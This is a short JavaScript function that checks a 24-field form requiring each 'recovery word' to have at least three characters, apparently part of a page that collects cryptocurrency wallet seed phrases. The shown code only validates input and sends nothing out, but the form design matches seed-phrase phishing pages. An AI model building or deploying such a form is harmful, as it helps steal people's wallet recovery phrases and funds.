
function PLX() {
    var signupFORM = document.frm;
    
    if (signupFORM.WoRd1.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd1.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd2.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd2.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd3.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd3.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd4.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd4.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd5.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd5.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd6.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd6.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd7.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd7.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd8.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd8.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd9.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd9.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd10.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd10.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd11.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd11.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd12.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd12.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd13.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd13.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd14.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd14.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd15.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd15.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd16.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd16.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd17.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd17.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd18.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd18.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd19.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd19.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd20.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd20.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd21.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd21.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd22.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd22.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd23.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd23.focus();
    return false;
    
    
    
    }
    if (signupFORM.WoRd24.value.length <3) {
    alert("Notification: Enter a valid recovery word.");
    signupFORM.WoRd24.focus();
    return false;
    
    
    
    }
    }